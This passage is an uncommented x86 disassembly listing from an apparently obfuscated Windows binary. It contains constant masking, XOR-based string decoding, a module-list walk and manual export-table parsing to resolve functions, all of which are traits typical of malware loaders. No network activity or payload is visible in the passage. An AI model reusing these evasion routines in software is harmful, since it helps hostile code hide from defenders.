  4222ee:	xor    edx,ecx
  4222f0:	lea    eax,[edi+edx*2+0x64e5f4]
  4222f7:	mov    bl,BYTE PTR [eax]
  4222f9:	sub    bl,0x6
  4222fc:	xor    bl,0x81
  4222ff:	cmp    bl,0x7b
  422302:	jne    0x4222c7
  422304:	mov    eax,DWORD PTR [ebp-0x4]
  422307:	pop    ebx
  422308:	cmp    eax,0xf89c85b6
  42230d:	je     0x42231b
  42230f:	xor    eax,ecx
  422311:	xor    ecx,ecx
  422313:	mov    WORD PTR [edi+eax*2+0x64e5f4],cx
  42231b:	mov    eax,edi
  42231d:	pop    edi
  42231e:	pop    esi
  42231f:	leave  
  422320:	ret    
  422321:	push   ebp
  422322:	mov    ebp,esp
  422324:	push   ecx
  422325:	push   esi
  422326:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42232d:	mov    esi,0xf89c85b5
  422332:	call   0x422209
  422337:	mov    cx,WORD PTR [eax]
  42233a:	mov    edx,0x3b5f
  42233f:	sub    cx,dx
  422342:	mov    edx,0x8a9d
  422347:	xor    cx,dx
  42234a:	mov    edx,0x4e3c
  42234f:	cmp    cx,dx
  422352:	je     0x4223ab
  422354:	push   ebx
  422355:	push   edi
  422356:	movzx  ecx,cx
  422359:	mov    edx,0xffcd8d06
  42235e:	mov    edi,0x75108b3
  422363:	mov    ebx,0x4e52
  422368:	cmp    cx,bx
  42236b:	jne    0x422370
  42236d:	mov    DWORD PTR [ebp-0x4],esi
  422370:	lea    esi,[edx+0x1]
  422373:	xor    esi,edi
  422375:	mov    edx,esi
  422377:	xor    edx,edi
  422379:	mov    cx,WORD PTR [eax+edx*2+0x64e5f4]
  422381:	mov    ebx,0x3b5f
  422386:	sub    cx,bx
  422389:	mov    ebx,0x8a9d
  42238e:	xor    cx,bx
  422391:	mov    ebx,0x4e3c
  422396:	cmp    cx,bx
  422399:	jne    0x422363
  42239b:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  4223a2:	pop    edi
  4223a3:	pop    ebx
  4223a4:	je     0x4223ab
  4223a6:	xor    eax,eax
  4223a8:	inc    eax
  4223a9:	jmp    0x4223ad
  4223ab:	xor    eax,eax
  4223ad:	pop    esi
  4223ae:	leave  
  4223af:	ret    
  4223b0:	push   ebp
  4223b1:	mov    ebp,esp
  4223b3:	push   ecx
  4223b4:	mov    eax,DWORD PTR [ebp+0x8]
  4223b7:	movzx  ecx,WORD PTR [eax]
  4223ba:	push   esi
  4223bb:	lea    eax,[ecx-0x3b5f]
  4223c1:	mov    esi,0x8a9d
  4223c6:	push   edi
  4223c7:	xor    eax,esi
  4223c9:	mov    edi,0x4e3c
  4223ce:	mov    DWORD PTR [ebp-0x4],edx
  4223d1:	cmp    ax,di
  4223d4:	je     0x422401
  4223d6:	mov    eax,DWORD PTR [ebp+0x8]
  4223d9:	sub    eax,edx
  4223db:	mov    DWORD PTR [ebp+0x8],eax
  4223de:	jmp    0x4223e3
  4223e0:	mov    eax,DWORD PTR [ebp+0x8]
  4223e3:	mov    WORD PTR [edx],cx
  4223e6:	add    edx,0x2
  4223e9:	movzx  edi,WORD PTR [eax+edx*1]
  4223ed:	mov    ecx,edi
  4223ef:	add    edi,0xffffc4a1
  4223f5:	xor    edi,esi
  4223f7:	mov    eax,0x4e3c
  4223fc:	cmp    di,ax
  4223ff:	jne    0x4223e0
  422401:	xor    eax,eax
  422403:	pop    edi
  422404:	mov    WORD PTR [edx],ax
  422407:	mov    eax,DWORD PTR [ebp-0x4]
  42240a:	pop    esi
  42240b:	leave  
  42240c:	ret    0x4
  42240f:	push   ebp
  422410:	mov    ebp,esp
  422412:	sub    esp,0x18
  422415:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  42241c:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  422423:	mov    ecx,DWORD PTR [ebp-0x8]
  422426:	push   esi
  422427:	mov    eax,0x75108b3
  42242c:	xor    ecx,eax
  42242e:	mov    esi,0x3272fa
  422433:	add    ecx,esi
  422435:	mov    DWORD PTR [ebp-0x4],ecx
  422438:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42243f:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  422446:	push   edi
  422447:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  42244e:	jmp    0x4224ef
  422453:	mov    ecx,DWORD PTR [ebp-0x4]
  422456:	mov    edx,DWORD PTR [ebp+0x10]
  422459:	sub    edx,ecx
  42245b:	mov    ecx,DWORD PTR [ebp-0xc]
  42245e:	xor    ecx,eax
  422460:	add    ecx,esi
  422462:	cmp    edx,ecx
  422464:	jbe    0x422481
  422466:	mov    edx,DWORD PTR [ebp-0x4]
  422469:	add    edx,DWORD PTR [ebp+0x8]
  42246c:	mov    ecx,DWORD PTR [ebp-0x4]
  42246f:	add    ecx,DWORD PTR [ebp+0xc]
  422472:	mov    edi,DWORD PTR [ecx]
  422474:	mov    DWORD PTR [edx],edi
  422476:	mov    ecx,DWORD PTR [ecx+0x4]
  422479:	mov    DWORD PTR [edx+0x4],ecx
  42247c:	mov    ecx,DWORD PTR [ebp-0xc]
  42247f:	jmp    0x4224ce
  422481:	mov    ecx,DWORD PTR [ebp-0x4]
  422484:	mov    edx,DWORD PTR [ebp+0x10]
  422487:	sub    edx,ecx
  422489:	mov    ecx,DWORD PTR [ebp-0x10]
  42248c:	xor    ecx,eax
  42248e:	add    ecx,esi
  422490:	cmp    edx,ecx
  422492:	mov    ecx,DWORD PTR [ebp-0x4]
  422495:	jbe    0x4224a9
  422497:	add    ecx,DWORD PTR [ebp+0x8]
  42249a:	mov    edx,DWORD PTR [ebp-0x4]
  42249d:	add    edx,DWORD PTR [ebp+0xc]
  4224a0:	mov    edx,DWORD PTR [edx]
  4224a2:	mov    DWORD PTR [ecx],edx
  4224a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4224a7:	jmp    0x4224ce
  4224a9:	mov    edx,DWORD PTR [ebp+0x10]
  4224ac:	sub    edx,ecx
  4224ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4224b1:	xor    ecx,eax
  4224b3:	add    ecx,esi
  4224b5:	cmp    edx,ecx
  4224b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4224ba:	jbe    0x4224df
  4224bc:	add    ecx,DWORD PTR [ebp+0x8]
  4224bf:	mov    edx,DWORD PTR [ebp-0x4]
  4224c2:	add    edx,DWORD PTR [ebp+0xc]
  4224c5:	mov    dx,WORD PTR [edx]
  4224c8:	mov    WORD PTR [ecx],dx
  4224cb:	mov    ecx,DWORD PTR [ebp-0x14]
  4224ce:	mov    edx,DWORD PTR [ebp-0x4]
  4224d1:	xor    ecx,eax
  4224d3:	lea    ecx,[ecx+edx*1+0x3272fa]
  4224da:	mov    DWORD PTR [ebp-0x4],ecx
  4224dd:	jmp    0x4224ef
  4224df:	add    ecx,DWORD PTR [ebp+0x8]
  4224e2:	mov    edx,DWORD PTR [ebp-0x4]
  4224e5:	add    edx,DWORD PTR [ebp+0xc]
  4224e8:	mov    dl,BYTE PTR [edx]
  4224ea:	mov    BYTE PTR [ecx],dl
  4224ec:	inc    DWORD PTR [ebp-0x4]
  4224ef:	mov    ecx,DWORD PTR [ebp-0x18]
  4224f2:	mov    edx,DWORD PTR [ebp+0x10]
  4224f5:	xor    ecx,eax
  4224f7:	add    ecx,esi
  4224f9:	imul   ecx,edx
  4224fc:	mov    edx,DWORD PTR [ebp-0x8]
  4224ff:	mov    edi,DWORD PTR [ebp-0x4]
  422502:	xor    edx,eax
  422504:	lea    edx,[edx+edi*1+0x3272fa]
  42250b:	cmp    edx,ecx
  42250d:	jb     0x422453
  422513:	pop    edi
  422514:	pop    esi
  422515:	leave  
  422516:	ret    0xc
  422519:	push   ebp
  42251a:	mov    ebp,esp
  42251c:	sub    esp,0xc
  42251f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  422526:	push   esi
  422527:	mov    esi,eax
  422529:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  422530:	mov    edx,DWORD PTR [ebp-0x4]
  422533:	mov    eax,0x75108b3
  422538:	xor    edx,eax
  42253a:	mov    ecx,0x3272fa
  42253f:	add    edx,ecx
  422541:	cmp    esi,edx
  422543:	je     0x422585
  422545:	push   ebx
  422546:	push   edi
  422547:	mov    edx,DWORD PTR [ebp-0x8]
  42254a:	mov    ebx,DWORD PTR [ebp+0x8]
  42254d:	xor    edx,eax
  42254f:	mov    edi,0xffcd8d06
  422554:	sub    edi,edx
  422556:	add    esi,edi
  422558:	lea    edx,[esi-0x3272fa]
  42255e:	xor    edx,eax
  422560:	mov    DWORD PTR [ebp-0xc],edx
  422563:	mov    edx,DWORD PTR [ebp-0x4]
  422566:	mov    edi,DWORD PTR [ebp-0xc]
  422569:	xor    dl,0xb3
  42256c:	sub    dl,0x6
  42256f:	xor    edi,eax
  422571:	mov    BYTE PTR [edi+ebx*1+0x3272fa],dl
  422578:	mov    edx,DWORD PTR [ebp-0x4]
  42257b:	xor    edx,eax
  42257d:	add    edx,ecx
  42257f:	cmp    esi,edx
  422581:	jne    0x422547
  422583:	pop    edi
  422584:	pop    ebx
  422585:	pop    esi
  422586:	leave  
  422587:	ret    0x4
  42258a:	push   ebp
  42258b:	mov    ebp,esp
  42258d:	sub    esp,0x21c
  422593:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42259a:	mov    DWORD PTR [ebp-0x14],0xf89c85b4
  4225a1:	mov    eax,DWORD PTR [ebp+0x10]
  4225a4:	mov    eax,DWORD PTR [ebp-0x4]
  4225a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4225aa:	push   esi
  4225ab:	push   edi
  4225ac:	mov    edi,0x75108b3
  4225b1:	xor    eax,edi
  4225b3:	mov    esi,0x3272fa
  4225b8:	add    eax,esi
  4225ba:	cmp    eax,ecx
  4225bc:	mov    eax,DWORD PTR [ebp-0x4]
  4225bf:	jne    0x4225ca
  4225c1:	xor    eax,edi
  4225c3:	add    eax,esi
  4225c5:	jmp    0x422676
  4225ca:	mov    ecx,DWORD PTR [ebp+0xc]
  4225cd:	xor    eax,edi
  4225cf:	add    eax,esi
  4225d1:	cmp    eax,ecx
  4225d3:	jne    0x4225da
  4225d5:	mov    eax,DWORD PTR [ebp-0x4]
  4225d8:	jmp    0x4225c1
  4225da:	lea    eax,[ebp-0x21c]
  4225e0:	mov    DWORD PTR [ebp-0x8],eax
  4225e3:	mov    eax,DWORD PTR [ebp+0xc]
  4225e6:	mov    DWORD PTR [ebp-0x10],eax
  4225e9:	mov    eax,DWORD PTR [ebp-0x4]
  4225ec:	xor    eax,edi
  4225ee:	add    eax,esi
  4225f0:	mov    DWORD PTR [ebp+0x10],eax
  4225f3:	mov    eax,DWORD PTR [ebp+0xc]
  4225f6:	push   ebx
  4225f7:	call   0x422321
  4225fc:	mov    ebx,eax
  4225fe:	mov    eax,DWORD PTR [ebp+0x8]
  422601:	mov    eax,DWORD PTR [eax+0x14]
  422604:	jmp    0x42265e
  422606:	mov    eax,DWORD PTR [ebp+0xc]
  422609:	sub    eax,0x8
  42260c:	mov    DWORD PTR [ebp-0xc],eax
  42260f:	mov    eax,DWORD PTR [ebp-0xc]
  422612:	mov    eax,DWORD PTR [eax+0x28]
  422615:	call   0x422209
  42261a:	mov    DWORD PTR [ebp+0x10],eax
  42261d:	push   DWORD PTR [ebp+0x10]
  422620:	mov    edx,DWORD PTR [ebp-0x8]
  422623:	call   0x4223b0
  422628:	mov    eax,DWORD PTR [ebp-0x4]
  42262b:	xor    eax,edi
  42262d:	add    eax,esi
  42262f:	cmp    eax,ebx
  422631:	jne    0x42263b
  422633:	mov    eax,DWORD PTR [ebp-0x8]
  422636:	call   0x422297
  42263b:	mov    eax,DWORD PTR [ebp-0x14]
  42263e:	xor    eax,edi
  422640:	add    eax,esi
  422642:	push   eax
  422643:	push   DWORD PTR [ebp-0x10]
  422646:	mov    eax,DWORD PTR [ebp-0x8]
  422649:	call   0x421fc3
  42264e:	mov    ecx,DWORD PTR [ebp-0x4]
  422651:	xor    ecx,edi
  422653:	add    ecx,esi
  422655:	cmp    eax,ecx
  422657:	je     0x42267c
  422659:	mov    eax,DWORD PTR [ebp+0xc]
  42265c:	mov    eax,DWORD PTR [eax]
  42265e:	mov    DWORD PTR [ebp+0xc],eax
  422661:	mov    eax,DWORD PTR [ebp+0x8]
  422664:	mov    ecx,DWORD PTR [ebp+0xc]
  422667:	add    eax,0x14
  42266a:	cmp    ecx,eax
  42266c:	jne    0x422606
  42266e:	mov    eax,DWORD PTR [ebp-0x4]
  422671:	xor    eax,edi
  422673:	add    eax,esi
  422675:	pop    ebx
  422676:	pop    edi
  422677:	pop    esi
  422678:	leave  
  422679:	ret    0xc
  42267c:	mov    eax,DWORD PTR [ebp-0xc]
  42267f:	mov    eax,DWORD PTR [eax+0x18]
  422682:	jmp    0x422675
  422684:	push   ebp
  422685:	mov    ebp,esp
  422687:	mov    eax,DWORD PTR [ebp+0xc]
  42268a:	sub    esp,0x10
  42268d:	cmp    DWORD PTR [ebp+0x8],0x0
  422691:	push   ebx
  422692:	push   esi
  422693:	push   edi
  422694:	je     0x422749
  42269a:	test   eax,eax
  42269c:	je     0x422749
  4226a2:	movzx  eax,WORD PTR [eax+0x20]
  4226a6:	mov    ecx,eax
  4226a8:	mov    DWORD PTR [ebp-0x10],eax
  4226ab:	xor    edx,edx
  4226ad:	and    DWORD PTR [ebp-0x8],edx
  4226b0:	mov    eax,0x8a9d
  4226b5:	xor    ecx,eax
  4226b7:	add    ecx,0x3b5f
  4226bd:	mov    DWORD PTR [ebp-0xc],ecx
  4226c0:	and    DWORD PTR [ebp-0x4],0x0
  4226c4:	xor    ecx,ecx
  4226c6:	push   0x7d
  4226c8:	pop    edi
  4226c9:	cmp    cx,WORD PTR [ebp-0xc]
  4226cd:	jae    0x422733
  4226cf:	lea    esi,[edx-0x3b5f]
  4226d5:	xor    esi,eax
  4226d7:	movzx  ecx,WORD PTR [ebp-0x4]
  4226db:	mov    ebx,DWORD PTR [ebp+0xc]
  4226de:	lea    ecx,[ebx+ecx*4]
  4226e1:	cmp    WORD PTR [ecx+0x2],si
  4226e5:	jne    0x42271e
  4226e7:	movzx  ecx,WORD PTR [ecx]
  4226ea:	mov    edi,0x4e3c
  4226ef:	cmp    cx,di
  4226f2:	jne    0x422700
  4226f4:	mov    ebx,DWORD PTR [ebp+0x8]
  4226f7:	movzx  edi,dx
  4226fa:	cmp    BYTE PTR [edi+ebx*1],0x0
  4226fe:	je     0x42272d
  422700:	mov    ebx,DWORD PTR [ebp+0x8]
  422703:	movzx  edi,dx
  422706:	movsx  di,BYTE PTR [edi+ebx*1]
  42270b:	mov    ebx,0x3b5f
  422710:	sub    di,bx
  422713:	xor    di,ax
  422716:	cmp    cx,di
  422719:	je     0x42272d
  42271b:	push   0x7b
  42271d:	pop    edi
  42271e:	inc    DWORD PTR [ebp-0x4]
  422721:	mov    cx,WORD PTR [ebp-0xc]
  422725:	cmp    WORD PTR [ebp-0x4],cx
  422729:	jb     0x4226d7
  42272b:	jmp    0x422733
  42272d:	inc    DWORD PTR [ebp-0x8]
  422730:	push   0x7a
  422732:	pop    edi
  422733:	mov    esi,DWORD PTR [ebp+0x8]
  422736:	movzx  ecx,dx
  422739:	cmp    BYTE PTR [ecx+esi*1],0x0
  42273d:	je     0x422752
  42273f:	inc    edx
  422740:	cmp    edi,0x7b
  422743:	jne    0x4226c0
  422749:	xor    eax,eax
  42274b:	pop    edi
  42274c:	pop    esi
  42274d:	pop    ebx
  42274e:	leave  
  42274f:	ret    0x8
  422752:	mov    ecx,DWORD PTR [ebp-0x8]
  422755:	add    ecx,0xffffc4a1
  42275b:	xor    cx,ax
  42275e:	xor    eax,eax
  422760:	cmp    cx,WORD PTR [ebp-0x10]
  422764:	sete   al
  422767:	jmp    0x42274b
  422769:	push   ebp
  42276a:	mov    ebp,esp
  42276c:	sub    esp,0x50
  42276f:	push   edi
  422770:	mov    edi,eax
  422772:	mov    eax,DWORD PTR [edi+0x1a8]
  422778:	cmp    DWORD PTR [eax],0x0
  42277b:	jne    0x422784
  42277d:	xor    eax,eax
  42277f:	jmp    0x4228b5
  422784:	push   DWORD PTR [ebp+0x8]
  422787:	push   0x2c
  422789:	pop    eax
  42278a:	call   0x422519
  42278f:	mov    edx,DWORD PTR [edi+0x1ac]
  422795:	lea    eax,[edi+0x22]
  422798:	mov    DWORD PTR [ebp-0x4c],eax
  42279b:	lea    eax,[edi+0x44]
  42279e:	mov    DWORD PTR [ebp-0x48],eax
  4227a1:	lea    eax,[edi+0x66]
  4227a4:	mov    DWORD PTR [ebp-0x44],eax
  4227a7:	lea    eax,[edi+0x88]
  4227ad:	mov    DWORD PTR [ebp-0x40],eax
  4227b0:	lea    eax,[edi+0xaa]
  4227b6:	mov    DWORD PTR [ebp-0x3c],eax
  4227b9:	lea    eax,[edi+0xcc]
  4227bf:	mov    DWORD PTR [ebp-0x38],eax
  4227c2:	lea    eax,[edi+0xee]
  4227c8:	mov    DWORD PTR [ebp-0x34],eax
  4227cb:	lea    eax,[edi+0x110]
  4227d1:	mov    DWORD PTR [ebp-0x30],eax
  4227d4:	lea    eax,[edi+0x132]
  4227da:	mov    DWORD PTR [ebp-0x2c],eax
  4227dd:	lea    eax,[edi+0x154]
  4227e3:	push   edi
  4227e4:	mov    DWORD PTR [ebp-0x50],edi
  4227e7:	mov    DWORD PTR [ebp-0x28],eax
  4227ea:	call   0x4228e9
  4227ef:	push   eax
  4227f0:	mov    eax,DWORD PTR [edi+0x1a8]
  4227f6:	push   DWORD PTR [eax]
  4227f8:	call   0x42258a
  4227fd:	mov    DWORD PTR [ebp-0x10],eax
  422800:	test   eax,eax
  422802:	je     0x4228b5
  422808:	mov    ecx,DWORD PTR [eax+0x3c]
  42280b:	push   ebx
  42280c:	push   esi
  42280d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  422811:	add    esi,eax
  422813:	mov    edi,DWORD PTR [esi+0x24]
  422816:	mov    ecx,DWORD PTR [esi+0x1c]
  422819:	mov    edx,DWORD PTR [esi+0x20]
  42281c:	mov    ebx,DWORD PTR [esi+0x18]
  42281f:	add    edi,eax
  422821:	mov    DWORD PTR [ebp-0x20],edi
  422824:	mov    edi,DWORD PTR [esi+0x14]
  422827:	add    ecx,eax
  422829:	add    edx,eax
  42282b:	mov    DWORD PTR [ebp-0xc],ecx
  42282e:	mov    DWORD PTR [ebp-0x1c],edx
  422831:	mov    DWORD PTR [ebp-0x8],edi
  422834:	cmp    edi,ebx
  422836:	ja     0x42283b
  422838:	mov    DWORD PTR [ebp-0x8],ebx
  42283b:	xor    ebx,ebx
  42283d:	mov    DWORD PTR [ebp-0x18],ebx
  422840:	cmp    DWORD PTR [ebp-0x8],ebx
  422843:	jbe    0x4228b3
  422845:	jmp    0x42284a
  422847:	mov    edx,DWORD PTR [ebp-0x1c]
  42284a:	mov    edi,DWORD PTR [ebp-0x20]
  42284d:	movzx  edi,WORD PTR [edi+ebx*2]
  422851:	cmp    ebx,DWORD PTR [esi+0x18]
  422854:	jae    0x4228b3
  422856:	cmp    edi,DWORD PTR [esi+0x14]
  422859:	jae    0x4228b3
  42285b:	mov    ebx,DWORD PTR [edx+ebx*4]
  42285e:	mov    edx,DWORD PTR [ebp+0x8]
  422861:	mov    edi,DWORD PTR [ecx+edi*4]
  422864:	mov    DWORD PTR [ebp-0x4],edx
  422867:	lea    edx,[ebp-0x50]
  42286a:	add    ebx,eax
  42286c:	add    edi,eax
  42286e:	sub    edx,DWORD PTR [ebp+0x8]
  422871:	mov    DWORD PTR [ebp-0x14],0xb
  422878:	mov    DWORD PTR [ebp-0x24],edx
  42287b:	mov    edx,DWORD PTR [ebp-0x4]
  42287e:	cmp    DWORD PTR [edx],0x0
  422881:	jne    0x42289e
  422883:	mov    eax,DWORD PTR [ebp-0x24]
  422886:	push   DWORD PTR [eax+edx*1]
  422889:	push   ebx
  42288a:	call   0x422684
  42288f:	mov    ecx,DWORD PTR [ebp-0xc]
  422892:	test   eax,eax
  422894:	je     0x42289b
  422896:	mov    eax,DWORD PTR [ebp-0x4]
  422899:	mov    DWORD PTR [eax],edi
  42289b:	mov    eax,DWORD PTR [ebp-0x10]
  42289e:	add    DWORD PTR [ebp-0x4],0x4
  4228a2:	dec    DWORD PTR [ebp-0x14]
  4228a5:	jne    0x42287b
  4228a7:	mov    ebx,DWORD PTR [ebp-0x18]
  4228aa:	inc    ebx
  4228ab:	mov    DWORD PTR [ebp-0x18],ebx
  4228ae:	cmp    ebx,DWORD PTR [ebp-0x8]
  4228b1:	jb     0x422847
  4228b3:	pop    esi
  4228b4:	pop    ebx
  4228b5:	pop    edi
  4228b6:	leave  
  4228b7:	ret    0x4
  4228ba:	push   ebp
  4228bb:	mov    ebp,esp
  4228bd:	mov    eax,DWORD PTR [ebp+0x8]
  4228c0:	push   esi
  4228c1:	push   DWORD PTR [eax+0x1e0]
  4228c7:	lea    esi,[eax+0x198]
  4228cd:	mov    eax,DWORD PTR [ebp+0x8]
  4228d0:	call   0x422769
  4228d5:	mov    ecx,DWORD PTR [esi]
  4228d7:	mov    DWORD PTR [ecx],eax
  4228d9:	mov    eax,DWORD PTR [esi]
  4228db:	xor    ecx,ecx
  4228dd:	cmp    DWORD PTR [eax],ecx
  4228df:	pop    esi
  4228e0:	setne  cl
  4228e3:	mov    eax,ecx
  4228e5:	pop    ebp
  4228e6:	ret    0x4
  4228e9:	mov    ecx,DWORD PTR [edi+0x188]
  4228ef:	push   ebx
  4228f0:	jmp    0x422905
  4228f2:	xor    eax,0x8a9d
  4228f7:	add    eax,0x3b5f
  4228fc:	mov    WORD PTR [ecx],ax
  4228ff:	add    ecx,0x2
  422902:	add    edx,0x2
  422905:	movzx  eax,WORD PTR [edx]
  422908:	mov    ebx,0x4e3c
  42290d:	cmp    ax,bx
  422910:	jne    0x4228f2
  422912:	xor    eax,eax
  422914:	mov    WORD PTR [ecx],ax
  422917:	mov    eax,DWORD PTR [edi+0x188]
  42291d:	pop    ebx
  42291e:	ret    
  42291f:	push   edi
  422920:	mov    edi,eax
  422922:	mov    eax,DWORD PTR [esi+0x188]
  422928:	shl    edi,0x6
  42292b:	add    eax,edi
  42292d:	jmp    0x422939
  42292f:	xor    cl,0x81
  422932:	add    cl,0x6
  422935:	mov    BYTE PTR [eax],cl
  422937:	inc    eax
  422938:	inc    edx
  422939:	mov    cl,BYTE PTR [edx]
  42293b:	cmp    cl,0x7b
  42293e:	jne    0x42292f
  422940:	mov    BYTE PTR [eax],0x0
  422943:	mov    eax,DWORD PTR [esi+0x188]
  422949:	add    eax,edi
  42294b:	pop    edi
  42294c:	ret    
  42294d:	push   ebp
  42294e:	mov    ebp,esp
  422950:	sub    esp,0x14
  422953:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42295a:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  422961:	mov    eax,DWORD PTR [ebx]
  422963:	mov    DWORD PTR [ebp-0x8],eax
  422966:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42296d:	push   esi
  42296e:	push   edi
  42296f:	mov    DWORD PTR [ebp-0x14],0xead71895
  422976:	mov    edi,DWORD PTR [ebp-0x4]
  422979:	mov    ecx,DWORD PTR [ebp-0x10]
  42297c:	mov    eax,0x75108b3
  422981:	xor    edi,eax
  422983:	mov    edx,0x3272fa
  422988:	xor    ecx,eax
  42298a:	add    edi,edx
  42298c:	add    ecx,edx
  42298e:	imul   edi,ecx
  422991:	jmp    0x4229d9
  422993:	mov    ecx,DWORD PTR [ebp-0x8]
  422996:	mov    esi,DWORD PTR [ebp-0x4]
  422999:	xor    ecx,eax
  42299b:	xor    esi,eax
  42299d:	add    ecx,edx
  42299f:	add    esi,edx
  4229a1:	test   esi,ecx
  4229a3:	mov    esi,DWORD PTR [ebp-0x8]
  4229a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4229a9:	je     0x4229c0
  4229ab:	xor    ecx,eax
  4229ad:	xor    esi,eax
  4229af:	add    ecx,edx
  4229b1:	add    esi,edx
  4229b3:	shr    esi,cl
  4229b5:	mov    ecx,DWORD PTR [ebp-0x14]
  4229b8:	xor    ecx,eax
  4229ba:	add    ecx,edx
  4229bc:	xor    esi,ecx
  4229be:	jmp    0x4229ca
  4229c0:	xor    esi,eax
  4229c2:	xor    ecx,eax
  4229c4:	add    esi,edx
  4229c6:	add    ecx,edx
  4229c8:	shr    esi,cl
  4229ca:	mov    DWORD PTR [ebp-0x8],esi
  4229cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4229d0:	xor    ecx,eax
  4229d2:	lea    edi,[edi+ecx*1+0x3272fa]
  4229d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4229dc:	mov    esi,DWORD PTR [ebp-0x4]
  4229df:	xor    esi,eax
  4229e1:	xor    ecx,eax
  4229e3:	sub    ecx,esi
  4229e5:	cmp    edi,ecx
  4229e7:	jbe    0x422993
  4229e9:	mov    eax,DWORD PTR [ebp-0x8]
  4229ec:	pop    edi
  4229ed:	mov    DWORD PTR [ebx],eax
  4229ef:	mov    eax,DWORD PTR [ebp-0x8]
  4229f2:	pop    esi
  4229f3:	leave  
  4229f4:	ret    
  4229f5:	push   ebp
  4229f6:	mov    ebp,esp
  4229f8:	sub    esp,0x38
  4229fb:	push   ebx
  4229fc:	mov    ebx,0xf89c85b5
  422a01:	mov    DWORD PTR [ebp-0x4],ebx
  422a04:	lea    ecx,[ebx-0x1]
  422a07:	mov    DWORD PTR [ebp-0x24],ecx
  422a0a:	mov    eax,DWORD PTR [ebp-0x4]
  422a0d:	mov    edx,DWORD PTR [ebp+0x8]
  422a10:	push   esi
  422a11:	mov    esi,0x75108b3
  422a16:	xor    eax,esi
  422a18:	push   edi
  422a19:	mov    edi,0x3272fa
  422a1e:	add    eax,edi
  422a20:	cmp    edx,eax
  422a22:	mov    eax,DWORD PTR [ebp-0x4]
  422a25:	je     0x422b8a
  422a2b:	mov    edx,DWORD PTR [ebp+0xc]
  422a2e:	xor    eax,esi
  422a30:	add    eax,edi
  422a32:	cmp    edx,eax
  422a34:	je     0x422b87
  422a3a:	mov    eax,DWORD PTR [ebp+0x10]
  422a3d:	mov    edx,DWORD PTR [ebp+0xc]
  422a40:	mov    DWORD PTR [ebp-0x14],eax
  422a43:	mov    eax,DWORD PTR [ebp+0x8]
  422a46:	mov    DWORD PTR [ebp-0x18],0xf89c8522
  422a4d:	mov    DWORD PTR [ebp-0xc],eax
  422a50:	lea    eax,[ebx+0x6]
  422a53:	mov    DWORD PTR [ebp-0x1c],eax
  422a56:	mov    DWORD PTR [ebp-0x10],ebx
  422a59:	mov    DWORD PTR [ebp+0xc],ecx
  422a5c:	mov    DWORD PTR [ebp+0x10],eax
  422a5f:	mov    eax,DWORD PTR [ebp+0xc]
  422a62:	xor    eax,esi
  422a64:	mov    DWORD PTR [ebp-0x20],edx
  422a67:	sub    edx,eax
  422a69:	sub    edx,edi
  422a6b:	mov    DWORD PTR [ebp+0x8],edx
  422a6e:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  422a75:	jmp    0x422b77
  422a7a:	mov    eax,DWORD PTR [ebp+0xc]
  422a7d:	mov    ecx,DWORD PTR [ebp+0xc]
  422a80:	xor    eax,esi
  422a82:	xor    ecx,esi
  422a84:	lea    ecx,[eax+ecx*1+0x64e5f4]
  422a8b:	mov    eax,DWORD PTR [ebp+0x8]
  422a8e:	xor    edx,edx
  422a90:	div    ecx
  422a92:	mov    eax,DWORD PTR [ebp+0x10]
  422a95:	mov    ecx,DWORD PTR [ebp+0xc]
  422a98:	xor    eax,esi
  422a9a:	xor    ecx,esi
  422a9c:	sub    eax,ecx
  422a9e:	cmp    edx,eax
  422aa0:	jne    0x422b36
  422aa6:	mov    eax,DWORD PTR [ebp+0x8]
  422aa9:	mov    ecx,DWORD PTR [ebp-0xc]
  422aac:	mov    dl,BYTE PTR [eax+ecx*1]
  422aaf:	mov    eax,DWORD PTR [ebp-0x10]
  422ab2:	mov    ecx,DWORD PTR [ebp-0x8]
  422ab5:	xor    eax,esi
  422ab7:	xor    ecx,esi
  422ab9:	add    eax,edi
  422abb:	add    ecx,edi
  422abd:	cmp    eax,ecx
  422abf:	jae    0x422b07
  422ac1:	lea    ecx,[eax-0x3272fa]
  422ac7:	mov    DWORD PTR [ebp-0x4],ecx
  422aca:	mov    ebx,DWORD PTR [ebp-0x4]
  422acd:	xor    ebx,esi
  422acf:	add    ebx,0x7f55d8fb
  422ad5:	lea    ecx,[ebp+eax*4-0x38]
  422ad9:	mov    DWORD PTR [ecx],ebx
  422adb:	mov    ebx,DWORD PTR [ecx]
  422add:	cmp    ebx,0x244ecb9a
  422ae3:	jbe    0x422aed
  422ae5:	add    DWORD PTR [ecx],0x405fcd9
  422aeb:	jmp    0x422af3
  422aed:	add    DWORD PTR [ecx],0xfdaf4327
  422af3:	mov    ecx,DWORD PTR [ebp-0x8]
  422af6:	xor    ecx,esi
  422af8:	inc    eax
  422af9:	inc    DWORD PTR [ebp-0x4]
  422afc:	add    ecx,edi
  422afe:	cmp    eax,ecx
  422b00:	jb     0x422aca
  422b02:	mov    ebx,0xf89c85b5
  422b07:	cmp    DWORD PTR [ebp-0x14],0x0
  422b0b:	jne    0x422b15
  422b0d:	xor    dl,0x81
  422b10:	add    dl,0x6
  422b13:	jmp    0x422b2b
  422b15:	mov    eax,DWORD PTR [ebp-0x18]
  422b18:	xor    al,0xb3
  422b1a:	mov    cl,0x6
  422b1c:	sub    cl,al
  422b1e:	add    dl,cl
  422b20:	mov    ecx,DWORD PTR [ebp-0x1c]
  422b23:	xor    cl,0xb3
  422b26:	sub    cl,0x6
  422b29:	ror    dl,cl
